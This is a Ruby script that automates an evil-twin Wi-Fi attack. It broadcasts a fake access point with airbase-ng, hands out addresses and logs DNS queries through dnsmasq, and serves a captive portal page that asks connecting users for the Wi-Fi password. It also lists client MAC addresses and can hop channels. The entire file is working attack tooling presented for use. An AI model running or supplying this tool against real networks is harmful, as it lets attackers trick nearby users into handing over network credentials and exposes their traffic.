#!/usr/bin/env ruby
# frozen_string_literal: true

require 'json'
require 'time'
require 'open3'

begin
  iface = ARGV[0]
  ssid = ARGV[1] || 'FreeWiFi'
  channel = (ARGV[2] || 6).to_i
  bssid = ARGV[3] || '00:11:22:33:44:55'
  portal_port = (ARGV[4] || 8080).to_i
  hop_interval = (ARGV[5] || 0).to_i

  raise 'interface required' unless iface

  stdout, stderr, status = Open3.capture3("iw dev #{iface} info 2>/dev/null")
  unless stdout.include?('type monitor')
    puts JSON.generate({ event: 'monitor_fail', iface: iface,
      data: { message: 'Interface not in monitor mode' },
      timestamp: Time.now.iso8601 })
    $stdout.flush
  end

  puts JSON.generate({ event: 'eviltwin_start', iface: iface, bssid: bssid,
    ssid: ssid, data: { channel: channel, portal_port: portal_port },
    timestamp: Time.now.iso8601 })
  $stdout.flush

  system('airmon-ng check kill 2>/dev/null')
  system("airbase-ng -e '#{ssid}' -c #{channel} -a #{bssid} #{iface} 2>/dev/null &")
  puts JSON.generate({ event: 'airbase_start', iface: iface, ssid: ssid,
    data: { channel: channel }, timestamp: Time.now.iso8601 })
  $stdout.flush
  sleep(2)

  system('ifconfig at0 up 2>/dev/null')
  system('ifconfig at0 192.168.1.1 netmask 255.255.255.0 2>/dev/null')
  puts JSON.generate({ event: 'interface_ready', iface: iface,
    data: { interface: 'at0', ip: '192.168.1.1' },
    timestamp: Time.now.iso8601 })
  $stdout.flush

  dnsmasq_conf = <<~CONF
    interface=at0
    dhcp-range=192.168.1.2,192.168.1.100,255.255.255.0,12h
    dhcp-option=3,192.168.1.1
    dhcp-option=6,192.168.1.1
    server=8.8.8.8
    log-queries
    log-dhcp
  CONF
  File.write('/tmp/dnsmasq.conf', dnsmasq_conf)
  puts JSON.generate({ event: 'config_written', iface: iface,
    data: { file: '/tmp/dnsmasq.conf' }, timestamp: Time.now.iso8601 })
  $stdout.flush

  hostapd_conf = "interface=at0\ndriver=nl80211\nssid=#{ssid}\nhw_mode=g\nchannel=#{channel}\n"
  File.write('/tmp/hostapd.conf', hostapd_conf)

  portal_html = <<~HTML
    <!DOCTYPE html>
    <html><head><title>WiFi Login</title>
    <meta name="viewport" content="width=device-width,initial-scale=1">
    <style>body{font-family:Arial;text-align:center;margin-top:50px}
    input{width:80%%;padding:10px;margin:5px;font-size:16px}
    button{width:80%%;padding:10px;background:#4CAF50;color:white;font-size:16px;border:none}
    </style></head><body>
    <h2>WiFi Authentication Required</h2>
    <p>Please login to access #{ssid}</p>
    <form method='POST' action='/login'>
    <input type='password' name='password' placeholder='WiFi Password' required>
    <button type='submit'>Connect</button>
    </form></body></html>
  HTML
  File.write('/tmp/captive_portal.html', portal_html)
  puts JSON.generate({ event: 'portal_created', iface: iface,
    data: { file: '/tmp/captive_portal.html', port: portal_port },
    timestamp: Time.now.iso8601 })
  $stdout.flush

  system('dnsmasq -C /tmp/dnsmasq.conf 2>/dev/null &')
  puts JSON.generate({ event: 'dnsmasq_start', iface: iface,
    data: { status: 'running' }, timestamp: Time.now.iso8601 })
  $stdout.flush

  portal_content = File.read('/tmp/captive_portal.html')
  server_script = <<~RUBY
    require 'socket'
    server = TCPServer.new(#{portal_port})
    while (client = server.accept)
      request = client.gets
      client.print "HTTP/1.1 200 OK\\r\\nContent-Length: #{portal_content.bytesize}\\r\\n\\r\\n"
      client.print #{portal_content.dump}
      client.close
    end
  RUBY
  File.write('/tmp/portal_server.rb', server_script)
  system('ruby /tmp/portal_server.rb &')
  puts JSON.generate({ event: 'portal_start', iface: iface,
    data: { port: portal_port, url: "http://192.168.1.1:#{portal_port}" },
    timestamp: Time.now.iso8601 })
  $stdout.flush

  stdout, stderr, status = Open3.capture3("iw dev #{iface} station dump 2>/dev/null")
  clients = stdout.scan(/Station ([0-9a-fA-F:]+)/).flatten
  clients.each do |mac|
    puts JSON.generate({ event: 'client_connected', iface: iface, bssid: bssid,
      data: { client_mac: mac }, timestamp: Time.now.iso8601 })
    $stdout.flush
  end

  if hop_interval > 0
    puts JSON.generate({ event: 'hop_enabled', iface: iface,
      data: { interval: hop_interval }, timestamp: Time.now.iso8601 })
    $stdout.flush
    channels = [1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 36, 40, 44, 48]
    loop do
      channels.each do |ch|
        system("iw dev #{iface} set channel #{ch} 2>/dev/null")
        puts JSON.generate({ event: 'channel_hop', iface: iface, bssid: bssid,
          data: { channel: ch }, timestamp: Time.now.iso8601 })
        $stdout.flush
        sleep(hop_interval)
      end
    end
  end

  puts JSON.generate({ event: 'eviltwin_running', iface: iface, ssid: ssid,
    data: { status: 'running' }, timestamp: Time.now.iso8601 })
  $stdout.flush

rescue Interrupt
  system("pkill -f 'airbase-ng.*#{iface}' 2>/dev/null") if iface
  system('pkill dnsmasq 2>/dev/null')
  system('pkill -f portal_server 2>/dev/null')
  puts JSON.generate({ event: 'eviltwin_stopped', iface: iface || '',
    data: { status: 'stopped' }, timestamp: Time.now.iso8601 })
rescue => e
  $stderr.puts JSON.generate({ event: 'error', data: { message: e.message,
    backtrace: e.backtrace&.first }, timestamp: Time.now.iso8601 })
  exit 1
end
